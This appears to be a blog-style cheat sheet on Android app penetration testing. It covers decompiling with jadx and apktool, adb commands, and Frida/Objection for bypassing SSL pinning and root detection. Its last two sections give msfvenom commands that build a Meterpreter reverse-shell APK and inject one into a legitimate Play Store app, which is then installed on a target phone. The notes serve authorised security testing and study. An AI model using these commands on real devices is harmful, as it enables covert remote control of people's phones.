---
title: Mobile Application Penetration Testing - Android
author: ioritz_elisa 
date: 2023-07-30 0:0:00 +0000 
categories: [Notes, Mobile Application Penetration Testing, Android] 
tags: [Android Static Analysis, Android Dynamic Analysis, Pentest Physical Device, Cloud enumeration, Firebase Database, Malicious APK, Legitimate APK] 
pin: true
---


## Basic Info

* Android is based on Linux -> Linux commands works.
* Manifest.xml -> it is a file that contains info about the version of the API used, the architecture (32 or 64) and more. It exists in all the application and it contains the permissions, activities, etc.

	'Permissions' contains the permissions that are required for the app.
    [Info-each-permission]([https://developer.android.com/reference/android/Manifest.permission](https://developer.android.com/reference/android/Manifest.permission))

	'Activities' contains the page of the applications.

	'Content' providers is used to share data from others apps.



## Interesting Tools

> Jadx

It is a decompiler to Java.

Command to install Java:

```
sudo apt-get install default-jdk
```

Command to install the tool:

```
sudo apt-get install jadx
```

Command to open the tool:

```
jadx-gui
```


> adb

Shell on Android emulators - adb

Command to install the tool:

```
sudo apt-get install adb
```

Checks if it has been run as root:

```
adb root
```

To open a shell on the device:

```
adb shell
```


> Android Studio

Android Studio - emulator

* To extract files on the device: View > Tool Windows > Device File Explorer.
* Open a terminal and can run adb shell and gain access to the phone: View > Tool Windows > Terminal.
* The terminal have a tab called "logcat" that may expose sensitive data stored in the log files.

```
adb shell
```


> apktool

Reverse engineer APK - apktool

Command to install the tool:

```
sudo apt-get install apktool
```


> MobSF

It is an automatic tool for static and dynamic analysis.

[MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)



## Android Static Analysis

> Tool Android Studio

Android Studio is an Integrated Development Environment (IDE) specifically designed for Android app development. It serves as the primary tool for Android developers to create, test, and deploy applications for Android devices. Android Studio provides a comprehensive set of features, including code editing, debugging, testing, and performance analysis, all within a user-friendly interface. It also includes the Android Emulator, which allows developers to simulate various Android devices for app testing. Android Studio is the official IDE supported by Google for Android app development and is widely used in the Android development community.

Open Android Studio and write "adb shell" in the terminal.


> Downloading an APK:

 1. Copy the path of the application.
 2. Write "exist" in the shell.
 3. In the terminal, create a directory and go there.
 4. Download the APK from the phone and save it on the atacker machine:

```
adb pull <path> <nameAPK>
```

Open the tool Jadx and import the APK to analyze its souce code.


> Other option is to decompile the APK with apktool:

```
apktool d <app.apk>
```

You can use the command 'strings' to watch the strings of a file:

```
strings <file>
```


> Tool Jadx

Its is a decompiler to Java.

In the directory smali in where all the source code is stored, but it isn´t so human writable. So, we can use **dex2jar** to read it better.


> If an activity have the parameter export = true, you can access by adb

```
adb shell

am start <activity>
```


> Commands:

List the applications installed on the phone:

```
pm list packages
```

Looking for an application:

```
pm list packages | grep <nameApp>
```

Looking for the path of the application:

```
pm path <package>
```



## Android Dynamic Analysis

> To intercept HTTPS trafic (with Burp, for example)-> SSL pinning or Frida.


> Interesting tools

* MobSF

Its a tool for see logs, SSL pinning, Frida scripts, generate report and more.

It has an option that offers 'HTTP Tools,' where we can monitor all the requests and responses of the APP. It also has a fuzzer, which allows it to send data to Burpsuite.

If you want to use Burpsuite to intercept the requests from the mobile device with the emulator, you may encounter an error related to the Burp certificate, and you'll have to add it to the phone. Export the certificate from Burp and import it into the phone.


* Objection

Objection is an SSL bypass tool that automatically injects Frida into an app. If the automatic injection doesn't work, you might need to perform a manual injection on the device. Objection simplifies the process of decompiling the APK, but there are cases where it may not work as expected.

Steps to install Objection:

```
pip3 install frida-tools

pip3 install objection
```

If the APP is an APK, you can use this command:

```
objection <path-apk> --source <nameAPK>
```

It generates a new APK pathed with Frida.

Sometimes it doesn't generate the certificates correctly and doesn't work properly.
This is to inject Frida automatically into the APK. If it doesn't work you can do it manually.

If it worked, you can control the APK with the command:

```
objection explore
```

You can disable SSL pinning to intercept trafic HTTPS in clear text:

```
android sslpinning disable
```

Dump the memory:

```
memory dump all
```

To bypass root permission:

```
android root disable
```

There are a lot of scripts in Frida: [https://codeshare.frida.re/](https://codeshare.frida.re/)

You can save one and you can use it with the command:

```
objection explore --startup-script <path>
```


* Inject Frida Manually

First, decompile the source code: 

```
apkool d -r <target.apk>
```

Download frida-gadget for your CPU Architecture. Unzip File, and rename file to frida-gadget.so.

Inject Frida-gadget into Android APP under: /lib/<'CPUArch-For-Your-Device'>

Save As: libfrida-gadget.so

Add reference to frida-gadget to SMALI code, in a known exported activity or otherwise accessible Activity (usually MainActivity.smali, or OnboardingActivity.smali): const-string v0, "frida-gadget" invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)

Recompile the application: 

```
apktool b <target.apk> -o <output_file.apk>
```

Update APK with your own keys and zipalign.

Sign with your key, and zipalign the APP:

[https://koz.io/using-frida-on-android-without-root/](https://koz.io/using-frida-on-android-without-root/)

For it to work, the APK must have the internet permission enabled. If not, you have to add it.

Now, upload the APK with Frida installed and install it on the phone.


> Tools to Open SQLite file

[https://sqlitebrowser.org/](https://sqlitebrowser.org/)



## Pentest Physical Device

> Steps:

* Install adb.

* Open Android Studio.

* Enable the developer options on the phone.

* Enable USB debugguing in the developers settings - permit to connect to the phone with adb.

* In the terminal of the Android Studio write "adb shell".

* Enable the option called "stay awake" in the settings of the emulator to prevent the terminal from locking while it is being analyzed. 

* See the other options because it can be interesting. For example, debugging an app, etc.

* You can add a proxy to intercept the queries in Burpsuite.


## Cloud enumeration

> Tool - Cloud Enum
 
[Cloud_enum-github](https://github.com/initstring/cloud_enum)

Syntax:

```
python3 cloud_enum.py -k <name.apk>
```



## Enumerating Firebase Database

> Tool Firebase-enum

[firebaseEnum-github](https://github.com/Sambal0x/firebaseEnum)

Syntax:

```
python3 firebaseEnum.py -k <nameAPK>
```



## Create a Malicious APK

> Tool - msfvenom

Syntax:

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali_IP> LPORT=<your_port> R> -o <myapp.apk>
```

This will make an APP with a generic looking icon named "Main Activity".

Install it to your target phone:

```
adb install <myapp.apk>
```

You must to open Metasploit with a multi/handler. It opens a Meterpreter connection.



## Inject a Meterpreter payload into a legitimate APK

[https://ibotpeaches.github.io/Apktool/install/](https://ibotpeaches.github.io/Apktool/install/)

> Steps to inject an APP from the play store:

* Download an APP to your Android device.

* Pull it using adb. And write this commands:

```
pm list packages | grep <app_name>
```

```
pm path <app_package_name>
```

```
exit adb shell
```

```
adb pull <path_to_apk/base.apk> -o <my_app.apk>
```

* After you have the APK, use the following msfvenom command to inject it automatically:

```
msfvenom -x <my_app.apk> -p android/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=<my_port> -o <my_app_hacked.apk>
```

* Uninstall the app from the target device, and install the hacked version using:

```
adb install <my_app_hacked.apk>
```

Interesting Article: [https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)

You must have usb debugging enabled (developer options) and be on the same network.


